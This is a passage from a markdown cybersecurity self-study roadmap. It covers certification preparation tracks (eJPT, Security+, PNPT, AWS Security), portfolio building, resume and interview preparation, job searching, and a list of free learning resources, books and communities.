- Rate limiting, input validation
- OWASP API Security Top 10

#### WEEK 3: Mobile Application Security

- Android security (APK analysis)
- iOS security basics
- Mobile API pentesting
- Certificate pinning bypass
- Mobile OWASP Top 10

#### WEEK 4: DevSecOps

- CI/CD pipeline security
- Container security scanning
- Secrets management
- Security testing automation
- SBOM (Software Bill of Materials)

---

## MONTH 11: Certification Preparation

_Choose certification based on Path A/B/C/D_

---

### OPTION 1: eJPT (eLearnSecurity Junior Penetration Tester)

**Best for**: Offensive Security Path beginners

#### Week 1-2: Course Content

- Complete INE Penetration Testing Student course
- Focus on: Networking, Web Apps, System Attacks
- Lab exercises daily
- Take notes on all topics

#### Week 3: Practice Labs

- INE labs (included with course)
- Additional TryHackMe rooms
- Practice report writing
- Time yourself

#### Week 4: Exam Prep

- Mock exams
- Review weak areas
- Practice enumeration speed
- Take exam

---

### OPTION 2: Security+ (CompTIA)

**Best for**: Defensive Security Path, foundational cert

#### Week 1: Domains 1-3

- Threats, Attacks, Vulnerabilities
- Architecture and Design
- Implementation
- Professor Messer videos + practice questions

#### Week 2: Domains 4-5

- Operations and Incident Response
- Governance, Risk, Compliance
- Complete practice exams

#### Week 3: Hands-on Practice

- TryHackMe Security+ rooms
- Jason Dion practice exams
- Lab work for practical understanding

#### Week 4: Exam Prep

- Review all domains
- Take 3+ full practice exams
- Memorize port numbers, acronyms
- Schedule and take exam

---

### OPTION 3: PNPT (Practical Network Penetration Tester)

**Best for**: Offensive Security Path, practical focus

#### Week 1-2: TCM Security Course

- Complete Practical Ethical Hacking course
- Focus on: Linux, Python, Networking, Active Directory
- Daily labs and practice
- Master pivoting and privilege escalation

#### Week 3: Capstone Practice

- Practice full network pentests
- Write professional reports
- Time management practice
- 5-day scenarios

#### Week 4: Exam Preparation

- 48-hour mock exam
- Report writing practice
- Review AD attacks
- Take exam

---

### OPTION 4: AWS Certified Security - Specialty

**Best for**: Cloud Security Path

#### Week 1-2: AWS Services

- IAM, KMS, CloudTrail, GuardDuty
- VPC Security, WAF, Shield
- A Cloud Guru or Stephane Maarek course
- Hands-on in AWS Free Tier

#### Week 3: Practice Exams

- TutorialsDojo practice tests
- Whizlabs practice exams
- Review incorrect answers
- Hands-on labs

#### Week 4: Final Prep

- Review all services
- Create mental map of services
- Take full practice exams
- Schedule and take exam

---

### NO CERTIFICATION PATH (Deeper Hands-On)

If choosing NOT to certify:

#### Week 1-4: Advanced Practice

- Complete 20 more HTB machines
- Participate in live CTF competitions
- Build 3 major portfolio projects
- Contribute to security tools (GitHub)
- Write in-depth blog posts
- Focus on real-world scenarios

---

## MONTH 12: Portfolio & Job Preparation

### Objectives:

- Build professional portfolio
- Create polished resume and LinkedIn
- Practice interviews
- Apply for jobs
- Continue skill development

---

### WEEK 1: Portfolio Development

#### Day 1-2: GitHub Portfolio

- Clean up all GitHub repositories
- Add detailed READMEs to each project
- Include:
    - Bash scripts from Month 2
    - Custom tools developed
    - CTF write-ups from Month 8
    - Lab documentation from Month 9
    - Specialization projects from Month 10
- Pin best 6 repositories
- Create professional GitHub profile README

#### Day 3-4: Personal Website/Blog

- Create security blog (Medium, GitHub Pages, or WordPress)
- Write 5 technical blog posts:
    1. How I learned cybersecurity (journey)
    2. Detailed CTF write-up
    3. Building a pentest lab
    4. Specialization-specific topic
    5. Tool/technique tutorial
- Professional design, good writing
- SEO optimization

#### Day 5: Video Content (Optional)

- Record YouTube walkthrough of CTF
- Screen recording of tool usage
- Interview question answers
- Demonstrate skills visually

#### Weekend: Portfolio Polish

- Proofread everything
- Get feedback from community
- Ensure all links work
- Professional presentation

---

### WEEK 2: Resume & LinkedIn

#### Day 1-2: Resume Creation

- Cybersecurity-focused resume
- Include:
    - Skills section (tools, technologies, methodologies)
    - Projects section (link to GitHub/blog)
    - Certifications (if applicable)
    - Education
    - Relevant experience (even if not security)
- Use action verbs
- Quantify achievements where possible
- Keep to 1-2 pages
- ATS-friendly format

#### Day 3: LinkedIn Optimization

- Professional headshot
- Compelling headline (not just "Looking for...")
- Detailed About section
- Add all skills with endorsements
- Add projects and certifications
- Write posts about security topics
- Connect with security professionals

#### Day 4: Cover Letter Templates

- Create 3 cover letter templates:
    1. Offensive security roles
    2. Defensive security roles
    3. General security analyst
- Personalization points for each company
- Highlight relevant projects

#### Day 5: Application Materials Review

- Get resume reviewed (r/cybersecurity, Discord communities)
- Professional review if possible
- Iterate based on feedback
- Finalize all materials

---

### WEEK 3: Interview Preparation

#### Day 1: Technical Interview Prep

- Common questions:
    - "Explain the OSI model"
    - "Walk me through how you would hack a website"
    - "Difference between symmetric and asymmetric encryption"
    - "What is your penetration testing methodology?"
    - "How do you stay updated on security?"
- Prepare STAR-method answers
- Practice explaining technical concepts simply

#### Day 2: Hands-on Technical Tests

- Practice live coding exercises
- Time-limited CTF scenarios
- Prepare for take-home assignments
- Practice explaining your thought process

#### Day 3: Behavioral Interview Prep

- Common behavioral questions:
    - "Tell me about yourself"
    - "Why cybersecurity?"
    - "Describe a challenge you overcame"
    - "Where do you see yourself in 5 years?"
    - "How do you handle stress/deadlines?"
- STAR method for all answers
- Record yourself answering

#### Day 4: Company Research

- Research target companies:
    - What they do
    - Recent security news
    - Technology stack
    - Security team size and structure
    - Glassdoor reviews
- Prepare company-specific questions

#### Day 5: Mock Interviews

- Practice with friend or mentor
- Record video interviews
- Join mock interview platforms
- Get feedback and improve

#### Weekend: Interview Skills

- Body language practice
- Confidence building
- Dress rehearsal
- Question preparation

---

### WEEK 4: Job Search & Continuous Learning

#### Day 1-2: Job Applications

- Apply to 10-20 positions
- Target roles:
    - Junior Penetration Tester
    - SOC Analyst (Tier 1/2)
    - Security Analyst
    - Cybersecurity Analyst
    - Vulnerability Analyst
- Tailor resume for each application
- Write personalized cover letters

#### Day 3: Networking

- Attend security meetups (local or virtual)
- Join Discord/Slack communities:
    - TryHackMe
    - HackTheBox
    - r/cybersecurity
    - Security certification discords
- Connect with professionals on LinkedIn
- Reach out for informational interviews

#### Day 4: Continuous Learning Plan

- **Daily**:
    - Read security news (Krebs, Schneier, r/netsec)
    - 1 TryHackMe room or HTB challenge
- **Weekly**:
    - Attend virtual security conference/webinar
    - Write blog post or update portfolio
- **Monthly**:
    - Participate in CTF competition
    - Learn new tool or technique
    - Attend local security meetup

#### Day 5: Long-term Goals

- 3-month goals after getting job
- 1-year career development plan
- Advanced certifications to pursue (OSCP, OSEP, PNPT, etc.)
- Specialization deepening
- Community contributions (tool development, teaching)

#### Weekend: Reflection & Celebration

- Review 12-month journey
- Celebrate accomplishments
- Acknowledge growth
- Thank mentors and supporters
- Keep pushing forward

---

## FINAL THOUGHTS

### You've Completed 12 Months. Now What?

**If you followed this roadmap**:

- ✓ Built strong technical foundation
- ✓ Gained hands-on experience with 50+ machines
- ✓ Developed specialization expertise
- ✓ Created professional portfolio
- ✓ Prepared for job market

**Next Steps**:

1. **Keep Practicing**: Skills decay without use
2. **Stay Current**: Security landscape changes rapidly
3. **Give Back**: Help others learning cybersecurity
4. **Never Stop Learning**: Technology evolves constantly
5. **Build Network**: Community is crucial in security

---

## RESOURCES QUICK REFERENCE

### Primary Learning Platforms (FREE)

- **TryHackMe** (free tier) - Guided rooms for beginners
- **HackTheBox Academy** (free modules) - In-depth content
- **OverTheWire** (Bandit, Natas, Leviathan) - Command line
- **PicoCTF** - Beginner-friendly CTF
- **PortSwigger Web Security Academy** - Web vulnerabilities

### Progression Path for Platforms

1. **Months 1-3**: TryHackMe Learning Paths + OverTheWire Bandit
2. **Months 4-6**: TryHackMe Easy Boxes + PicoCTF
3. **Months 7-9**: HackTheBox Easy Machines + TryHackMe Medium
4. **Months 10-12**: HTB Medium + Proving Grounds Practice

### YouTube Channels (Free Education)

- **NetworkChuck** - Networking & Linux fundamentals
- **IppSec** - HackTheBox walkthroughs
- **John Hammond** - CTF walkthroughs, malware analysis
- **LiveOverflow** - Binary exploitation, advanced topics
- **Computerphile** - Computer science concepts
- **Professor Messer** - CompTIA certifications
- **HackerSploit** - Penetration testing tutorials
- **TheCyberMentor** - Ethical hacking, bug bounty

### Books (Recommended Reading)

- "The Web Application Hacker's Handbook" - Stuttard & Pinto
- "Penetration Testing" - Georgia Weidman
- "The Hacker Playbook 3" - Peter Kim
- "Practical Malware Analysis" - Sikorski & Honig
- "Blue Team Handbook" - Don Murdoch
- "RTFM: Red Team Field Manual" - Ben Clark

### Communities

- **Reddit**: r/cybersecurity, r/netsec, r/AskNetsec
- **Discord**: TryHackMe, HackTheBox, InfoSec Prep
- **Twitter**: #infosec, #cybersecurity (follow practitioners)
- **Local**: OWASP chapters, BSides conferences, security meetups

---

## CONCLUSION

Cybersecurity is a journey, not a destination. This 12-month roadmap gives you a structured path from complete beginner to job-ready professional.

**Remember**:

- **Consistency beats intensity** - 2-3 hours daily is better than 12 hours once a week
- **Document everything** - Your portfolio is your proof
- **Don't get stuck** - If blocked >3 days, move on and return later
- **Join communities** - Learning together accelerates growth
- **Ethics matter** - Only test systems you own or have authorization to test
- **Celebrate progress** - Recognize how far you've come

**You're building expertise. Trust the process. Stay curious. Keep hacking.**

🔒 **Good luck on your cybersecurity journey!** 🔒

---

_This roadmap was designed for self-learners with minimal financial resources but maximum dedication. Adjust timelines based on your schedule, but maintain the sequential structure for optimal learning._

_Last Updated: February 2026_